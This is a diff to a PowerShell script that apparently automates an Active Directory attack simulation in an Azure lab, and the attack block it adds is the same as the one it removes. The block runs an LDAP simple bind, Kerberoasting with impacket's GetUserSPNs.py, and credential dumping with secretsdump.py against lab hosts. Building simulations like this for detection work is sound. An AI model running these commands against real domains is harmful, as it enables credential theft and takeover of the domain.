@@ -975,78 +975,6 @@ $output.Value | ForEach-Object { $_.Message }
 
 
 
-# LDAP Simple Bind and Kerberosting attack sim
-# Python script to execute on the Linux VM 
-$PythonScript = @"
-from ldap3 import Server, Connection, ALL, SIMPLE
-
-def connect_to_ad(server_address, user, password):
-    server = Server(server_address, get_info=ALL)
-    try:
-        conn = Connection(
-            server,
-            user=user,
-            password=password,
-            authentication=SIMPLE,
-            auto_bind=True
-        )
-        if conn.bind():
-            print(f\"Successfully connected as {user}\")
-        else:
-            print(f\"Failed to bind: {conn.result}\")
-    except Exception as e:
-        print(f\"An error occurred: {e}\")
-    finally:
-        if conn:
-            conn.unbind()
-
-AD_SERVER = 'ldap://10.0.0.4'
-AD_USER1 = 'ODOMAIN\\\\$LDAPUserAccount1'
-AD_USER2 = 'ODOMAIN\\\\$LDAPUserAccount2'
-AD_PASSWORD = '$adminPassword'
-
-connect_to_ad(AD_SERVER, AD_USER1, AD_PASSWORD)
-connect_to_ad(AD_SERVER, AD_USER2, AD_PASSWORD)
-"@
-
-#Write-Output $PythonScript
-
-# Bash command to create and run the Python script
-$Command = @"
-#!/bin/bash
-export DEBIAN_FRONTEND=noninteractive
-sudo apt-get update -y
-sudo apt-get install -y python3-pip python3-venv
-python3 -m pip install --user pipx
-python3 -m pipx ensurepath
-export PATH="`$PATH`:`$HOME/.local/bin"
-python3 -m pipx install impacket
-pip3 install ldap3
-echo "$PythonScript" > /tmp/temp_script.py
-python3 /tmp/temp_script.py
-sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
-sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
-unset DEBIAN_FRONTEND 
-"@
-
-
-# Execute the command on the Linux VM
-Write-Output "Executing script on the Linux VM web01..."
-try {
-    $result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName `
-                                    -VMName $web01Name `
-                                    -CommandId "RunShellScript" `
-                                    -ScriptString $Command
-
-    if ($result) {
-        Write-Output "Command executed successfully. Output:"
-        $result.Value[0].Message | Write-Output
-    } else {
-        Write-Output "Command execution failed or returned no output."
-    }
-} catch {
-    Write-Error "Failed to execute command: $_"
-}
 
 
 
@@ -1410,3 +1338,81 @@ Write-Output "`n[+] There should be Event Log for a Type 2 logon for `$UserName.
 
 $output = Invoke-AzVMRunCommand -ResourceGroupName "ITOperations" -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script2
 $output.Value | ForEach-Object { $_.Message }
+
+
+
+# Final stage of the attack
+# LDAP Simple Bind, Kerberosting, Lateral Movement to mserv, AD compromise
+
+# Python script to execute on the Linux VM 
+$PythonScript = @"
+from ldap3 import Server, Connection, ALL, SIMPLE
+
+def connect_to_ad(server_address, user, password):
+    server = Server(server_address, get_info=ALL)
+    try:
+        conn = Connection(
+            server,
+            user=user,
+            password=password,
+            authentication=SIMPLE,
+            auto_bind=True
+        )
+        if conn.bind():
+            print(f\"Successfully connected as {user}\")
+        else:
+            print(f\"Failed to bind: {conn.result}\")
+    except Exception as e:
+        print(f\"An error occurred: {e}\")
+    finally:
+        if conn:
+            conn.unbind()
+
+AD_SERVER = 'ldap://10.0.0.4'
+AD_USER1 = 'ODOMAIN\\\\$LDAPUserAccount1'
+AD_USER2 = 'ODOMAIN\\\\$LDAPUserAccount2'
+AD_PASSWORD = '$adminPassword'
+
+connect_to_ad(AD_SERVER, AD_USER1, AD_PASSWORD)
+connect_to_ad(AD_SERVER, AD_USER2, AD_PASSWORD)
+"@
+
+#Write-Output $PythonScript
+
+# Bash command to create and run the Python script
+$Command = @"
+#!/bin/bash
+export DEBIAN_FRONTEND=noninteractive
+sudo apt-get update -y
+sudo apt-get install -y python3-pip python3-venv
+python3 -m pip install --user pipx
+python3 -m pipx ensurepath
+export PATH="`$PATH`:`$HOME/.local/bin"
+python3 -m pipx install impacket
+pip3 install ldap3
+echo "$PythonScript" > /tmp/temp_script.py
+python3 /tmp/temp_script.py
+sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
+sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
+unset DEBIAN_FRONTEND 
+"@
+
+
+# Execute the command on the Linux VM
+Write-Output "Executing script on the Linux VM web01..."
+try {
+    $result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName `
+                                    -VMName $web01Name `
+                                    -CommandId "RunShellScript" `
+                                    -ScriptString $Command
+
+    if ($result) {
+        Write-Output "Command executed successfully. Output:"
+        $result.Value[0].Message | Write-Output
+    } else {
+        Write-Output "Command execution failed or returned no output."
+    }
+} catch {
+    Write-Error "Failed to execute command: $_"
+}
+
